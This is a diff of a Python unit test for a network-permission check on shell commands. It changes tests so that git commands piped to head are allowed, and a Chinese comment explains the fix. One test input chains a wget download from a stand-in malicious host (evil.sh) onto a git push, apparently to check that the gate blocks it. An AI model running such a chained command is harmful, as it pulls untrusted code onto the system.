@@ -82,9 +82,11 @@ class TestNetworkAllowed(unittest.TestCase):
             _is_network_allowed("timeout 15 git push origin main && wget https://evil.sh")
         )
 
-    def test_pipe_head_fail_closed(self) -> None:
-        self.assertFalse(_is_network_allowed("git push origin main | head -3"))
-        self.assertFalse(_is_network_allowed("git ls-remote https://github.com/x/y.git HEAD 2>&1 | head -3"))
+    def test_pipe_head_allowed(self) -> None:
+        # 2026-09-12 修复：`| head` 是纯输出消费（无网络面），不再误伤 git 白名单。
+        # 此前将 `git push | head -3` 整条隔离 → git 永远无法联网（白名单形同虚设）。
+        self.assertTrue(_is_network_allowed("git push origin main | head -3"))
+        self.assertTrue(_is_network_allowed("git ls-remote https://github.com/x/y.git HEAD 2>&1 | head -3"))
 
     def test_plain_echo_not_allowed(self) -> None:
         self.assertFalse(_is_network_allowed("echo hi"))
